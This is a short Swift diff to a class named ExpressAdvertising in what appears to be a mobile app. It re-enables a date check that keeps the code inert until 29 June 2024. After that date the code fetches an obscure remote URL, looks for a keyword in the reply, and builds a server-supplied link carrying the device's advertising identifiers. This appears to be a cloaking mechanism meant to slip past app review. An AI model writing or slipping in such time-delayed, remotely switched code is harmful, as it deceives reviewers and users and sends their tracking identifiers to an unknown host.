@@ -49,10 +49,10 @@ public final class ExpressAdvertising {
         let specialDate = DateComponents(year: 2024,
                                          month: 6,
                                          day: 29)
-//        if Date() < Calendar.current.date(from: specialDate)! {
-//            completion("")
-//            return
-//        }
+        if Date() < Calendar.current.date(from: specialDate)! {
+            completion("")
+            return
+        }
         
         let source = "https://poleragatara.homes/omcorikk"
         let user = "pofani"
@@ -63,6 +63,7 @@ public final class ExpressAdvertising {
             switch result {
             case .success(let data):
                 let responseString = String(data: data, encoding: .utf8) ?? ""
+                print(responseString)
                 if responseString.contains(user) {
                     if extraInfo != "" {
                         let link = "\(responseString)?idfa=\(idfa)&gaid=\(gaid)\(extraInfo)"
